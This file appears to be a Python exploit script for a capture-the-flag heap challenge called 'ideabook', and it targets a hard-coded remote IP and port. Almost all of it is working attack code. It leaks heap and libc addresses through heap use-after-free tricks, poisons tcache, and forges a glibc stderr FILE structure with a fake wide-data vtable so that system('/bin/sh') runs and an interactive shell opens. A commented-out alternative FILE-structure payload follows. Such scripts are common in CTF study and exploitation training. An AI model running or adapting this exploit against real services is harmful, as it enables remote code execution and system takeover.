from ptrlib import *
import argparse

binary = "./ideabook"
elf = ELF(binary)

success = False
parser = argparse.ArgumentParser()
parser.add_argument(
    "--host",
    default="127.0.0.1",
    help="target host"
)
parser.add_argument(
    "--port",
    default=3001,
    help="target port"
)
parser.add_argument(
    '--log',
    action='store_true'
)
parser.add_argument(
    '--remote',
    nargs=2,
    metavar=('REMOTE_HOST', 'REMOTE_PORT'),
    help='remote host and port'
)
args = parser.parse_args()

def main():
    r = None
    """
    libc = ELF("./libc.so.6")
    """
    libc = ELF("./libc.so.6")
    r = Socket("nc 34.170.146.252 17253")
    # """

    is_remote = r is not None or args.remote is not None
    if r is None:
        if is_remote:
            host = args.remote[0]
            port = args.remote[1]
            r = Socket(host, port)
        else:
            r = Process(binary)


    def just_u64(x):
        return u64(x.ljust(8, b'\x00'))


    def wait_for_attach():
        if not is_remote:
            input('attach?')


    def create(idx, size):
        r.sendlineafter(">", str(1))
        r.sendlineafter("Index:", str(idx))
        r.sendlineafter("Size: ", str(size))

    def edit(idx, content):
        r.sendlineafter(">", str(2))
        r.sendlineafter("Index:", str(idx))
        r.sendlineafter("Content: ", content)

    def read(idx):
        r.sendlineafter(">", str(3))
        r.sendlineafter("Index:", str(idx))
        r.recvuntil("Content: ")
        s = r.recvuntil(">")[:-1]
        # dummy
        r.sendline(str(3))
        r.sendlineafter("Index:", str(idx))
        r.recvuntil("Content: ")

        return s

    def delete(idx):
        r.sendlineafter(">", str(4))
        r.sendlineafter("Index:", str(idx))

    # heap 
    create(0, 0xff)
    for i in range(4):
        create(3+i, 0xff)
    create(7, 0xd0)
    for i in range(6):
        create(8 + i, 0xd0)
    for i in range(6):
        delete(8 + i)

    create(16, 0xf0)
    # check if it's mapped
    #edit(0, b"A")
    #s = read(0)
    delete(7)
    s = read(0)
    if len(s) == 0:
        return False
    global success
    success = True
    heap_base = just_u64(s[:8]) - 0x7f0
    print("heap_base:", hex(heap_base))

    edit(0, p64(heap_base + 0x3b0))
    create(2, 0xd0)

    edit(0, p64(heap_base + 0x3a0))
    create(1, 0xd0)

    edit(1, p64(0) + p64(0x441))
    #create(9, p64(0x42c0)[:2])
    delete(2)

    s = read(3)
    libc_base = just_u64(s[:8]) 
    print("libc_base:", hex(libc_base))
    libc.base = libc_base - 0x21ace0
    io_stdout = libc.symbol("_IO_2_1_stderr_")


    create(10, 0xe2)
    create(11, 0xe9)
    delete(10)
    delete(11)


    print("io_stdout: ", hex(io_stdout))
    edit(0, p64(io_stdout) * 4)
    create(10, 0xe2)
    target = 0x230
    edit(0, p64(io_stdout+target) * 4)
    create(11, 0xe9)
    
    fake_wide_data = p64(0) * 4
    fake_wide_data += p64(1) # _IO_write_ptr
    fake_wide_data = fake_wide_data.ljust(0x8 * 13, b'\0')
    fake_wide_data += p64(libc.symbol("system")) # __doallocate
    fake_wide_data = fake_wide_data.ljust(0xe0, b'\0')
    fake_wide_data += p64(libc.symbol("_IO_2_1_stderr_")+target)
    print("fake_wide_data: ", hex(len(fake_wide_data)))
    assert len(fake_wide_data) <= 0xff
    edit(11, fake_wide_data)

    wait_for_attach()

    fake_file = b'  /bin/sh\0'
    fake_file = fake_file.ljust(0xa0, b'\0')
    fake_file += p64(libc.symbol("_IO_2_1_stderr_")+target) # wide_data
    fake_file = fake_file.ljust(0xc0, b'\0')
    fake_file += p32(1) # _mode
    fake_file = fake_file.ljust(0xd8, b'\0')
    fake_file += p64(libc.symbol("_IO_wfile_jumps")) # vtable

    print("fake_file: ", hex(len(fake_file)))
    assert len(fake_file) <= 0xff
    edit(10, fake_file)




    '''
    fake_file = flat([
        0x3b01010101010101, u64(b"/bin/sh\0"), # flags / rptr
        0, 0, # rend / rbase
        0, 1, # wbase / wptr
        0, 0, # wend / bbase
        0, 0, # bend / savebase
        0, 0, # backupbase / saveend
        0, 0, # marker / chain
    ], map=p64)
    fake_file += p64(libc.symbol("system")) # __doallocate
    fake_file += b'\x00' * (0x88 - len(fake_file))
    fake_file += p64(libc.base + 0x21ba70) # lock
    fake_file += b'\x00' * (0xa0 - len(fake_file))
    fake_file += p64(libc.symbol("_IO_2_1_stdout_")) # wide_data
    fake_file += b'\x00' * (0xd8 - len(fake_file))
    fake_file += p64(libc.base + 0x2160c0) # vtable (_IO_wfile_jumps)
    fake_file += p64(libc.symbol("_IO_2_1_stdout_") + 8) # _wide_data->_wide_vtable
    '''
    r.interactive()

for i in range(64):
    if success:
        break
    main()